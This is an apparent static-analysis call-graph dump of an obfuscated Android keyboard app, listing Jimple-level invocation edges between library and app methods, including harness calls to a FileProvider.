SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.String toHexString(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.lang.Comparable: int compareTo(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lts: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: int b()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int b()>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw f(java.lang.String)> ==> <ivw: ivv I()>
SPECIAL edge: specialinvoke $r24.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_SUGGESTION_METADATA", 24, 24) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $r9 = virtualinvoke $r8.<llo: lma u()>() in <hbv: void j()> ==> <llo: lma u()>
STATIC edge: $i5 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<lqp: void <init>(java.lang.Object[],int,int)>($r2, 0, $i0) in <lqq: lma g()> ==> <lqp: void <init>(java.lang.Object[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqm: java.lang.Object get(int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be greater than size (%s)", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lsb: void <init>(int,int)> ==> <lsa: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void q(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void q(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lkq: int hashCode()>
STATIC edge: staticinvoke <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>($r3, $r3, $i5, $i0, $i4) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<lts: lsz c(int)>($i1) in <lsn: boolean ac()> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_IMAGE", 14, 14) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int min(int,int)>($i2, $i1) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int min(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r11.<lma: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: int size()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: int size()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int a()>() in <lvq: int size()> ==> <lvq: int a()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(byte[],byte[])>($r4, $r5) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(byte[],byte[])>
SPECIAL edge: specialinvoke $r26.<mag: void <init>(java.lang.String,int,int)>("TENOR_AUTOCOMPLETE_METADATA", 26, 26) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<gcs: void <init>(hbv,lma,int)>(r0, $r9, 12) in <hbv: void j()> ==> <gcs: void <init>(hbv,lma,int)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljf: int b()> ==> <iye: void I(boolean,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, 0) in <lvr: void <init>(java.util.List)> ==> <lvr: boolean e(int,int)>
CLINIT edge: staticinvoke <jvu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jvu: void <clinit>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalStateException: void <init>(java.lang.String)>("Recursive update") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <ljd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljd: void <clinit>()>
STATIC edge: $i4 = staticinvoke <izw: int af(int,int)>($i3, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(13) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<qc: void <init>()>() in <ivw: void <clinit>()> ==> <qc: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map o()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<java.lang.String: int compareTo(java.lang.String)>($r2) in <java.lang.String: int compareTo(java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.String)>
INTERFACE edge: $r0 = interfaceinvoke $r2.<lwi: java.lang.StackTraceElement[] b(java.lang.Class,int)>($r1, $i0) in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.lang.Object k(int)>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_period", class "Llst;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: $r5 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: $r10 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r13) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("extension subtags are out of order: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>($r1) in <lri: void t(java.lang.Object,int)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must be less than size (%s)", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lvr: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r6.<lvs: int compareTo(java.lang.Enum)>($r7) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int compareTo(java.lang.Enum)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: java.util.Iterator iterator()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ivw: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(17) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] x()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(0) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <ljd: java.util.Iterator l()> ==> <java.util.LinkedHashMap: java.util.Set entrySet()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Flag [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingSearchTermMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(11) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_Initialized", $r3) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Error: void <init>()> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljd: void A(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.List: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void q(int)>(3) in <ljd: void <init>()> ==> <ljd: void q(int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(16) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lkm: java.lang.Object a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>($l2, $l3) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r2, $r5) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean isEmpty()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lvs: lvs a(java.lang.Object)>($r1) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
CLINIT edge: staticinvoke <coo: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <coo: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r5.<lqd: lqd c()>() in <lmb: lme f()> ==> <lqd: lqd c()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: $r3 = interfaceinvoke $r5.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lid: int hashCode()>
VIRTUAL edge: $r8 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r6, "", $r7, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean x(char)>
VIRTUAL edge: $r7 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
INTERFACE edge: $z0 = interfaceinvoke $r8.<java.util.Iterator: boolean hasNext()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.a: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/c;", "value") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int size()>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljf: void i(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>($r3, $r4) in <lme: lma d(java.lang.Object)> ==> <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsc: void <init>(lto)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <lri: int b(java.util.Set)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: int size()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gbk: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lrg: void <init>(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: int hashCode()>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 1) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r3) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <mij: void <init>(miy)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>($r2, $l0) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)> ==> <j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(7) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: staticinvoke <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>($r2, $r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>
SPECIAL edge: specialinvoke $r9.<lwk: void <init>()>() in <lwf: void <clinit>()> ==> <lwk: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r4.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <liy: void <init>(ljd)> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lql: int size()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorCategoryMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lma: int e(int)>
STATIC edge: $r3 = staticinvoke <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>($r2, $r6) in <llg: java.lang.Object next()> ==> <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
